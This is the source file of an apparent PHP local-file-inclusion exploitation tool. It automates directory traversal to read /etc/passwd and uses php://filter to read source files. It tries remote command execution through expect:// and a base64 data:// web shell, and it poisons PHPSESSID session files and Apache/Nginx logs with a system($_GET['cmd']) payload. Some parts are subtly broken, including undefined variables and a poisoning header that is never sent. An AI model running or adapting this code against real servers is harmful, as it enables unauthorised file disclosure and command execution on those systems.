from UAList import fetchUA
import re
import requests
from urllib.parse import quote
from termcolor import colored


class Payload:

	def __init__(self, url, initiate=True, poc=[quote("/etc/passwd"), "/etc/passwd%00"], verbosity=1):
		self.url = url
		self.verbosity = verbosity
		# The quote method automatically url encodes the string
		self.linux_dirTraversal = [quote("../../../../../../.."), quote("/../../../../../../.."), quote("....//....//....//....//....//....//..../"), quote("//....//....//....//....//....//....//..../"), quote(".././.././.././.././.././.."), quote("/.././.././.././.././.././..")]
		# poc -> Proof Of Concept (Change it if you want)
		self.poc = poc

		# Filter
		self.filterPaths = [quote("/etc/passwd"), quote("index"), quote("index.php"), quote("index.html")]
		self.filterBase = quote("php://filter/read=convert.base64-encode/resource=")

		# Headers. One is without url encoding beacause it encodes also the base64 and the server doesn't like that
		self.phpHeaders = [quote("expect://id"), "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id"]

		# PHPSESSID Cooki
		self.cookiePath = "/var/lib/php/sessions/sess_"

		# payload for RCE
		self.payload = "<?php system($_GET['cmd']); ?>"
		if initiate:
			self.Attack()

	def Attack(self):
		if self.urlCheck():
			self.dirTraversalCheck()
			self.headerCheck()
			self.filterCheck()
			self.cookieCheck()
			self.logPoisonCheck()

	def hit(self, url):
		response = requests.get(url, headers=fetchUA())
		response = response.text
		return self.stripHtmlTags(response)

	# Checks if the url is valid
	def urlCheck(self):
		try:
			ret = requests.get(self.url, headers=fetchUA())
			if ret.status_code == 200:
				return True
			else:
				return False	
		except Exception as e:
			print(colored('[-]', 'red', attrs=['bold']) + ' Something went wrong, ', e)
			print(colored('[!]', 'yellow', attrs=['bold']) + ' The URL format must be http://[URL]?[something]=')
			return False
			


			
	# Strips all HTML tags from the HTTP response	
	def stripHtmlTags(self, t):
		htmlchars = re.compile('<.*?>')
		clean = re.sub(htmlchars, '', t)
		return clean

		
		

	# Checks for directory traversal
	def dirTraversalCheck(self):
		for i in self.linux_dirTraversal:
			for n in self.poc:
				compUrl = self.url + i + n
				if self.verbosity > 1:
					print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
				clean = self.hit(compUrl)
				if 'root:x' in clean.lower():
					print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)
				else:
					if self.verbosity > 0:
						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')




	# Checks for Remote Code Execution with php headers
	def headerCheck(self):
		for header in self.phpHeaders:
			compUrl = self.url + header
			if self.verbosity > 1:
				print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
			clean = self.hit(compUrl)
			if 'uid=' in clean.lower():
				print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl)
			else:
				if self.verbosity > 0:
					print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')

	
	# Checks if it can retrieve files with the php filter	
	def filterCheck(self):
		for path in self.filterPaths:
			compUrl = self.url + self.filterBase + path
			if self.verbosity > 1:
				print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
			clean = self.hit(compUrl)
			words = clean.split()
			if len(words) > 0:
				for word in words:
					if word.endswith('='):
						print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)			
					else:
						if self.verbosity > 0:
							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
			else:
				if self.verbosity > 0:
					print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')




	# Checks if the PHPSESSID cookie can be exploited
	def cookieCheck(self):
		if self.verbosity > 1:
			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: PHPSESSID cookie injection')
		s = requests.Session()
		session = s.get(self.url, headers=fetchUA())
		cookies = session.cookies.get_dict()
		for cookie in cookies:
			if 'phpsessid' in cookie.lower():
				# it gets the value of the cookie
				value = session.cookies[i]
				#send the payload to see if there is RCE
				newUrl = self.url + self.payload
				s.get(newUrl, headers=fetchUA())
				# open the file to find if the command worked
				compUrl = self.url + self.cookiePath + value + "&cmd=id"
				clean = self.hit(compUrl)	
				if 'uid='  in clean.lower():
					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + cookiePath + '[cookie value] can be poisoned')
				else:
					if self.verbosity > 0:
						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')


	def logPoisonCheck(self):
		headers = {"User-Agent": self.payload}
		response = requests.get(self.url, headers=fetchUA())
		if self.verbosity > 1:
			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: Log Poisoning based on server type.')
		# checks the type of the server
		if "apache" in response.headers['Server'].lower():
			if self.verbosity > 1:
				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as Apache2')
			# Apache logs
			logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ")]
			for d_path in self.linux_dirTraversal:
				for l_path in logPath:
					pathth = self.url + d_path + l_path
					compUrl = pathth + "&cmd=id"
					clean = self.hit(compUrl)
					if "uid=" in clean.lower():
						print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathth)	
					else:
						if self.verbosity > 0:
							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')		

		elif "nginx" in response.headers['Server'].lower():
			# Nginx logs
			if self.verbosity > 1:
				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as NGINX')
			log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log")]
			for d_path in self.linux_dirTraversal:
				for l_path in log:
					pathh = self.url + d_path + l_path
					compUrl = pathh + "&cmd=id"
					clean = self.hit(compUrl)
					if "uid=" in clean.lower():
						print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh)
					else:
						if self.verbosity > 0:
							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')	
		else:
			print(colored('[-]', 'red', attrs=['bold']) + " A directory traversal attack is VALID but the server type " + url.getheader('Server') + " is not supported!!!")

